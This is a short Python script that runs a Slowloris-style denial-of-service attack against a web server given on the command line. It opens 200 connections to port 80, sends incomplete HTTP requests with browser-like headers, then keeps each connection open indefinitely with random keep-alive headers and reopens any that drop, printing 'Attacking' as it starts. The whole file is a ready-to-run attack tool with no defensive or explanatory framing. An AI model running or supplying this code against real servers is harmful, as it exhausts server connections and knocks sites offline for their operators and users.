import socket
import random
import time
import sys

log_level=2

def log(text,level=1):
    if log_level>=level:
       print(text)

list_of_sockets=[]

regular_headers=["user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36","accept-language: en-US,en;q=0.9,hi;q=0.8"] # To be filled

def init_socket(ip):
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    s.connect((ip,80))

    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0,2000)).encode())
    for header in regular_headers:
        s.send("{}\r\n".format(header).encode())
    return s

def main():
    if len(sys.argv)!=2:
        print("Usage: {} example.com".format(sys.argv[0]))
        return
    ip=sys.argv[1]
    socket_count=200
    log("Attacking {} with {} sockets.".format(ip,socket_count))

    log("Creating sockets....")
    for _ in range (socket_count):
        try:
            log("Creating socket nr {}".format(_),level=2)
            s=init_socket(ip)
        except socket.error:
            break
        list_of_sockets.append(s)
    while True:
        log("Sending keep-alive headers....Socket count:{}".format(len(list_of_sockets)),level=2)
        for s in list(list_of_sockets):
            try:
                s.send("X-a: {}\r\n".format(random.randint(1,5000)).encode())
            except socket.error:
                list_of_sockets.remove(s)

        for _ in range(socket_count-len(list_of_sockets)):
            log("Recreating socket....")
            try:
                s=init_socket(ip)
                if s:
                    list_of_sockets.append(s)
            except socket.error:
                break
        time.sleep(15)

if __name__ == "__main__":
    main()
